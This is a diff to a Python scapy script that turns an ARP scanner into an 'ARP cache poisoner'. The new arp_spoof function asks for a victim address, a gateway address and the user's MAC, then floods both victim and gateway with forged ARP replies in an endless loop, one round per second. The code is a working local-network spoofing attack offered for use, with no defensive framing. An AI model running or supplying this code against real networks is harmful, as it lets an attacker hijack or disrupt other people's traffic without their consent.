@@ -1,9 +1,9 @@
-""" Arp scanner """
+""" Arp scanner and cache poisoner. No MiTM """
+import time
 
 from scapy.all import conf
 from scapy.all import srp
 from scapy.arch import get_if_addr, get_if_hwaddr
-from scapy.interfaces import get_if_list
 from scapy.layers.l2 import Ether, ARP
 
 # Retrieve MAC address and IP address of devices on the network
@@ -19,11 +19,12 @@ def arp_spoof():
     victim = input("Enter victim address: ")
     gateway = input("Enter gateway address: ")
     my_mac = input("Enter your MAC address: ")
-    poison_victim = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)/ARP(op=2, pdst=f"{victim}", psrc=f"{gateway}")
-    poison_router = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)/ARP(op=2, pdst=f"{gateway}", psrc=f"{victim}")
-    srp(poison_victim, timeout=1)
-    srp(poison_router, timeout=1)
-
+    while True:
+        poison_victim = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)/ARP(op=2, pdst=f"{victim}", psrc=f"{gateway}")
+        poison_router = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac)/ARP(op=2, pdst=f"{gateway}", psrc=f"{victim}")
+        srp(poison_victim, timeout=1)
+        srp(poison_router, timeout=1)
+        time.sleep(1)
 
 
 interfaces_list = conf.ifaces
